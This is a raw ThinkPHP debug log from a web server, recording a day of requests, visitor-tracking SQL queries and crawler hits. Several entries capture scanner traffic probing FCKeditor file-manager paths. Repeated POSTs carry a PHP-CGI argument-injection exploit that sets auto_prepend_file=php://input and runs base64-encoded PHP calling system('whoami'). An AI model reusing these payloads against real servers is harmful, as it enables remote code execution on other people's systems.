---------------------------------------------------------------
[ 2024-08-31T08:50:07+08:00 ] 104.247.184.210 GET aosuper.com/fckeditor/editor/filemanager/browser/default/browser.html
[è¿è¡Œæ—¶é—´ï¼š0.014823s] [åžåçŽ‡ï¼š67.46req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.05kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'fckeditor',
    1 => 'editor',
    2 => 'filemanager',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
  'accept-language' => 'en-US, tr; q=0.5',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'browser' => 'default',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T08:50:08+08:00 ] 104.247.184.210 GET aosuper.com/html/js/editor/fckeditor/editor/filemanager/browser/default/browser.html
[è¿è¡Œæ—¶é—´ï¼š0.015571s] [åžåçŽ‡ï¼š64.22req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.44kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'html',
    1 => 'js',
    2 => 'editor',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
  'accept-language' => 'en-US, tr; q=0.5',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'fckeditor' => 'editor',
  'filemanager' => 'browser',
  'default' => 'browser',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T08:50:08+08:00 ] 104.247.184.210 GET aosuper.com/admin/fckeditor/editor/filemanager/browser/default/browser.html
[è¿è¡Œæ—¶é—´ï¼š0.035676s] [åžåçŽ‡ï¼š28.03req/s] [å†…å­˜æ¶ˆè€—ï¼š1,337.82kb] [æ–‡ä»¶åŠ è½½ï¼š37]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'fckeditor',
    2 => 'editor',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
  'accept-language' => 'en-US, tr; q=0.5',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'filemanager' => 'browser',
  'default' => 'browser',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T09:26:19+08:00 ] 66.249.66.39 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.231173s] [åžåçŽ‡ï¼š4.33req/s] [å†…å­˜æ¶ˆè€—ï¼š2,948.05kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.119 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'amp-cache-transform' => 'google;v="1..8"',
  'host' => 'www.aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000674s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.003600s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.39' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000562s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000283s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.39' [ RunTime:0.007335s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('66.249.66.39' , 2 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 09:26:19' , 10 , 'æ™®é€šç½‘å‹') [ RunTime:0.000503s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '66.249.66.39'  AND `ucookie` IS NULL [ RunTime:0.006141s ]
---------------------------------------------------------------
[ 2024-08-31T09:39:43+08:00 ] 193.29.13.79 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.089994s] [åžåçŽ‡ï¼š11.11req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.70kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000583s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002696s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '193.29.13.79' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.042595s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000553s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '193.29.13.79' [ RunTime:0.006692s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('193.29.13.79' , 1 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 09:39:43' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000613s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '193.29.13.79'  AND `ucookie` IS NULL [ RunTime:0.006192s ]
---------------------------------------------------------------
[ 2024-08-31T09:39:44+08:00 ] 193.29.13.79 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.041075s] [åžåçŽ‡ï¼š24.35req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.56kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000696s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002715s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '193.29.13.79' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000451s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000311s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '193.29.13.79'  AND `ucookie` IS NULL [ RunTime:0.006948s ]
---------------------------------------------------------------
[ 2024-08-31T09:39:46+08:00 ] 193.29.13.79 GET aosuper.com/login.php/index/captcha
[è¿è¡Œæ—¶é—´ï¼š0.113192s] [åžåçŽ‡ï¼š8.83req/s] [å†…å­˜æ¶ˆè€—ï¼š11,505.83kb] [æ–‡ä»¶åŠ è½½ï¼š50]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ BIND ] 'admin'
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'captcha',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\admin\controller\Index->captcha[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000667s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002623s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` IS NULL [ RunTime:0.019528s ]
---------------------------------------------------------------
[ 2024-08-31T09:39:48+08:00 ] 193.29.13.79 GET aosuper.com/login.php/index/
[è¿è¡Œæ—¶é—´ï¼š0.136199s] [åžåçŽ‡ï¼š7.34req/s] [å†…å­˜æ¶ˆè€—ï¼š11,455.36kb] [æ–‡ä»¶åŠ è½½ï¼š51]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ BIND ] 'admin'
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'index.php',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/thinkphp/tpl/dispatch_jump.tpl [ array (
  0 => 'code',
  1 => 'msg',
  2 => 'data',
  3 => 'url',
  4 => 'wait',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000867s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002562s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` IS NULL [ RunTime:0.020994s ]
---------------------------------------------------------------
[ 2024-08-31T10:13:11+08:00 ] 141.98.83.239 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015056s] [åžåçŽ‡ï¼š66.42req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T10:13:12+08:00 ] 141.98.83.239 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015084s] [åžåçŽ‡ï¼š66.30req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T10:27:00+08:00 ] 188.143.169.41 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.724299s] [åžåçŽ‡ï¼š1.38req/s] [å†…å­˜æ¶ˆè€—ï¼š2,943.80kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 X11; Ubuntu; Linux x86_64; rv:126.0 Gecko/20100101 Firefox/126.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000680s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002579s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '188.143.169.41' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.033957s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000515s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '188.143.169.41' [ RunTime:0.006848s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('188.143.169.41' , 1 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 10:27:00' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.032749s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '188.143.169.41'  AND `ucookie` IS NULL [ RunTime:0.006613s ]
---------------------------------------------------------------
[ 2024-08-31T11:53:56+08:00 ] 141.98.83.185 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.577367s] [åžåçŽ‡ï¼š1.73req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T11:53:57+08:00 ] 141.98.83.185 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015411s] [åžåçŽ‡ï¼š64.89req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T13:20:08+08:00 ] 141.98.83.185 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.894342s] [åžåçŽ‡ï¼š1.12req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T13:20:10+08:00 ] 141.98.83.185 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015388s] [åžåçŽ‡ï¼š64.99req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T14:16:16+08:00 ] 161.97.166.161 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š1.332468s] [åžåçŽ‡ï¼š0.75req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.96kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001457s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.029009s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '161.97.166.161' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.049910s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000704s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '161.97.166.161' [ RunTime:0.042036s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('161.97.166.161' , 2 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 14:16:16' , 2 , 'æ™®é€šç½‘å‹') [ RunTime:0.000632s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '161.97.166.161'  AND `ucookie` IS NULL [ RunTime:0.006959s ]
---------------------------------------------------------------
[ 2024-08-31T14:41:02+08:00 ] 141.98.83.185 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.145912s] [åžåçŽ‡ï¼š6.85req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T14:41:03+08:00 ] 141.98.83.185 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.016186s] [åžåçŽ‡ï¼š61.78req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T15:17:29+08:00 ] 43.131.48.214 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š4.094480s] [åžåçŽ‡ï¼š0.24req/s] [å†…å­˜æ¶ˆè€—ï¼š2,949.92kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://aosuper.com',
  'pragma' => 'no-cache',
  'connection' => 'close',
  'cache-control' => 'no-cache',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
